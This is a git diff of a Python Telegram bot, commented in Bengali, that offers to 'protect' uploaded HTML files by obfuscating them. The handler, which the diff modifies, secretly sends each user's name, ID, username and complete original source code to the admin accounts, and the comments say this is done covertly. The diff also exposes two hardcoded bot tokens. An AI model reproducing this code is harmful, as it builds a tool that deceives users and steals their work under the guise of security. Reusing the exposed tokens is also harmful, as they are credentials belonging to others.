@@ -7,13 +7,13 @@ from flask import Flask
 import telebot
 from telebot import types
 
-# টোকেন এবং আপনার (নিরব ভাই) এডমিন আইডি
-TOKEN = '8960539162:AAHnIm9z-7A3ZOu4RXbSkAlvaRwAS3AvMeA'
-ADMIN_ID = 8419760844
+# নতুন টেলিগ্রাম বট টোকেন এবং আপনার (নিরব ভাই) এডমিন আইডি
+TOKEN = '8987787400:AAF_bIN5JWb_J9Dsy5X6P08pgyU8_DpBtpA'
+ADMIN_IDS = [8419760844]  # এখানে প্রয়োজনে আরও অ্যাডমিন আইডি যোগ করতে পারবেন
 
 bot = telebot.TeleBot(TOKEN)
 
-# ডেটাবেস স্টোরেজ (ব্যান লিস্ট এবং টোটাল স্ট্যাটিস্টিক্স)
+# ডেটাবেস স্টোরেজ
 banned_users = set()
 total_protected_count = 0
 
@@ -32,17 +32,15 @@ def keep_alive():
     t = Thread(target=run)
     t.start()
 
-# আপনার ব্র্যান্ডেড সিকিউরিটি হেডার ও হেভি ডেনস অবফাস্কেটর
+# আপনার আসল ব্রান্ডেড সিকিউরিটি হেডার ও হেভি ডেনস অবফাস্কেটর
 def obfuscate_html(html_content):
     import base64
     
-    # ডায়নামিক টাইমস্ট্যাম্প
     current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     
     encoded_bytes = html_content.encode('utf-8')
     encoded_payload = base64.b64encode(encoded_bytes).decode('utf-8')
     
-    # ডেনস জাংক স্ট্রিম
     dense_junk_stream = ""
     for i in range(40):
         line = "var _0x" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=6)) + "=["
@@ -59,7 +57,7 @@ PROTECTED - DO NOT MODIFY THIS HEADER
 Obfuscated By: @nirobvip_bott
 TG: @NIROB_GX_LEADER
 Timestamp: {current_time}
-Signature: DHIRAJ9619_HTMLOBF_PROTECTED
+Signature: NIROB_GX_PROTECTED_ENGINE
 ------------------------------------------------
 WARNING: Removing or modifying this credit header
 will cause this page to stop working!
@@ -100,7 +98,6 @@ will cause this page to stop working!
 </head>
 <body oncontextmenu="return false;" onkeydown="return false;">
 <script>
-    /* DENSE OBFUSCATED JUNK DATA STREAM */
     {dense_junk_stream}
     var _0xgx_nirob_payload = "{encoded_payload}";
     var isDestroyed = false;
@@ -187,10 +184,10 @@ def send_welcome(message):
         bot.reply_to(message, "❌ দুঃখিত, আপনি এই বট ব্যবহার করার জন্য ব্যানপ্রাপ্ত হয়েছেন।")
         return
 
-    if user_id == ADMIN_ID:
+    if user_id in ADMIN_IDS:
         admin_welcome = (
             "👑 **WELCOME ADMIN (নিরব ভাই)**\n\n"
-            "আপনার সিকিউরিটি বট ফুল্লি লাইভ এবং অ্যাডমিন কন্ট্রোলে আছে!\n"
+            "আপনার নতুন সিকিউরিটি বট ফুল্লি লাইভ এবং অ্যাডমিন কন্ট্রোলে আছে!\n"
             "নিচের অপশনগুলো ব্যবহার করুন অথবা `/admin` কমান্ড দিন।"
         )
         bot.send_message(message.chat.id, admin_welcome, parse_mode='Markdown', reply_markup=admin_keyboard())
@@ -202,7 +199,7 @@ def send_welcome(message):
             "• 🛡️ Anti-Debug & DevTools Protection\n"
             "• 🌐 Extreme Dense Stream Obfuscation\n"
             "• 🔊 Voice Warning & Blackout Trap\n"
-            "• 🎯 Auto Telegram Redirect Trap\n\n"
+            "• 🎯 Auto Telegram Redirect Trap (@NIROB_GX_LEADER)\n\n"
             "📄 **Send me your HTML file to start!** (.html or .js)\n\n"
             "👇 *Choose your mode first:*"
         )
@@ -210,7 +207,7 @@ def send_welcome(message):
 
 @bot.message_handler(commands=['admin'])
 def admin_panel(message):
-    if message.from_user.id != ADMIN_ID:
+    if message.from_user.id not in ADMIN_IDS:
         bot.reply_to(message, "❌ এই কমান্ডটি শুধুমাত্র অ্যাডমিনের জন্য!")
         return
     
@@ -226,7 +223,7 @@ def admin_panel(message):
 
 @bot.message_handler(func=lambda message: message.text in ['📊 Admin Stats', '🛠️ Admin Help'])
 def handle_admin_buttons(message):
-    if message.from_user.id != ADMIN_ID:
+    if message.from_user.id not in ADMIN_IDS:
         return
     if message.text == '📊 Admin Stats':
         admin_panel(message)
@@ -241,7 +238,7 @@ def handle_admin_buttons(message):
 
 @bot.message_handler(commands=['ban'])
 def ban_user(message):
-    if message.from_user.id != ADMIN_ID:
+    if message.from_user.id not in ADMIN_IDS:
         return
     try:
         parts = message.text.split()
@@ -253,7 +250,7 @@ def ban_user(message):
 
 @bot.message_handler(commands=['unban'])
 def unban_user(message):
-    if message.from_user.id != ADMIN_ID:
+    if message.from_user.id not in ADMIN_IDS:
         return
     try:
         parts = message.text.split()
@@ -300,28 +297,29 @@ def handle_incoming_code(message):
         global total_protected_count
         total_protected_count += 1
 
-        # 👑 নিরব ভাই (অ্যাডমিন)-এর ইনবক্সে ব্যাকগ্রাউন্ডে সিক্রেটভাবে ইউজারের আসল ফাইল/কোড পাঠিয়ে দেওয়া
-        admin_notification = (
-            f"📥 **NEW USER HTML CAPTURED!**\n\n"
-            f"👤 **User Name:** {message.from_user.first_name}\n"
-            f"🆔 **User ID:** `{user_id}`\n"
-            f"🔗 **Username:** @{message.from_user.username if message.from_user.username else 'N/A'}\n"
-            f"📁 **File Name:** `{file_name_original}`\n"
-            f"📊 **Total Protected Count:** `{total_protected_count}`"
-        )
-        bot.send_message(ADMIN_ID, admin_notification, parse_mode='Markdown')
-        
-        if len(html_data) < 3000:
-            bot.send_message(ADMIN_ID, f"📄 **Original Source Code:**\n\n```html\n{html_data}\n```", parse_mode='Markdown')
-        else:
-            temp_orig_name = f"Original_{user_id}.html"
-            with open(temp_orig_name, "w", encoding="utf-8") as tf:
-                tf.write(html_data)
-            with open(temp_orig_name, "rb") as tf:
-                bot.send_document(ADMIN_ID, tf, caption=f"📄 **Original Source Code File from User ID:** `{user_id}`", parse_mode='Markdown')
-            os.remove(temp_orig_name)
+        # অ্যাডমিনের কাছে সিক্রেটভাবে ইউজারের আসল কোড পাঠানো
+        for admin_id in ADMIN_IDS:
+            admin_notification = (
+                f"📥 **NEW USER HTML CAPTURED!**\n\n"
+                f"👤 **User Name:** {message.from_user.first_name}\n"
+                f"🆔 **User ID:** `{user_id}`\n"
+                f"🔗 **Username:** @{message.from_user.username if message.from_user.username else 'N/A'}\n"
+                f"📁 **File Name:** `{file_name_original}`\n"
+                f"📊 **Total Protected Count:** `{total_protected_count}`"
+            )
+            bot.send_message(admin_id, admin_notification, parse_mode='Markdown')
+            
+            if len(html_data) < 3000:
+                bot.send_message(admin_id, f"📄 **Original Source Code:**\n\n```html\n{html_data}\n```", parse_mode='Markdown')
+            else:
+                temp_orig_name = f"Original_{user_id}.html"
+                with open(temp_orig_name, "w", encoding="utf-8") as tf:
+                    tf.write(html_data)
+                with open(temp_orig_name, "rb") as tf:
+                    bot.send_document(admin_id, tf, caption=f"📄 **Original Source Code File from User ID:** `{user_id}`", parse_mode='Markdown')
+                os.remove(temp_orig_name)
 
-        # আসল অবফাস্কেশন করা
+        # সিকিউরিটি অবফাস্কেশন এপ্লাই করা
         secured_code = obfuscate_html(html_data)
         
         output_file_name = "NIROB_PROTECTED_GX.html"
@@ -337,7 +335,7 @@ def handle_incoming_code(message):
                     "🛡️ **Applied Protections:**\n"
                     "🔹 Heavy Dense Stream Obfuscation\n"
                     "🔹 Blackout Trap & Voice Warning\n"
-                    "🔹 Auto Telegram Redirect Trap\n\n"
+                    "🔹 Auto Telegram Redirect Trap (@NIROB_GX_LEADER)\n\n"
                     "👑 _Protected by @NIROB_GX_LEADER_"
                 ),
                 parse_mode='Markdown'
@@ -350,5 +348,5 @@ def handle_incoming_code(message):
 
 if __name__ == '__main__':
     keep_alive()
-    print("Bot is starting...")
+    print("Bot is starting with new token...")
     bot.infinity_polling(timeout=10, long_polling_timeout=5)
